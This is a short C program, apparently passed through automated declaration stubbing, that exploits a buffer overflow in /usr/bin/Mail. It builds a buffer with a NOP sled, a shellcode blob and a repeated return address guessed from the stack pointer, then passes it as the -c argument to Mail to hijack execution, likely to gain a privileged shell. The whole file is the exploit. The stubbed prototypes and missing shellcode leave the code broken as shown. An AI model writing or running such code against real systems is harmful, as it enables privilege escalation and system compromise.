
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 int * buffer ;
 int execl (char*,char*,char*,char*,char*,char*,int *,int ) ;
 int fprintf (int ,char*) ;
 int getesp () ;
 int memcpy (int *,int ,int ) ;
 int memset (int *,int,int) ;
 int shellcode ;
 int stderr ;
 int strlen (int ) ;

int main(int argc, char **argv)
{
        int x;
        long addr = getesp() - 18000;

        memset(buffer, 0x90, 10000);
        memcpy(buffer + 800, shellcode, strlen(shellcode));

        for(x = 876; x < 9998; x += 4)
                *(int *)&buffer[x] = addr;

        fprintf(stderr, "type '.' and enter: ");

        execl("/usr/bin/Mail", "/usr/bin/Mail", "nobody", "-s",
                "blah", "-c", buffer, 0);
}
